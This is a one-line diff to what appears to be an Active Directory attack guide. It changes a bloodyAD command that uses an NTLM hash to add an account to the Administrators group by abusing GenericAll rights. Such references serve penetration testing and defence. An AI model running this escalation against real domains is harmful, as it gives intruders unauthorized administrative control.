@@ -43,7 +43,7 @@ If you have **GenericAll** over a group object, you can add your account to that
 - With **BloodyAD**:
 
 ```bash
-bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add groupMember 'Administrators' test
+bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :NTLMHASH add groupMember 'Administrators' targetuser
 ```
 
 - With **rpcclient**:
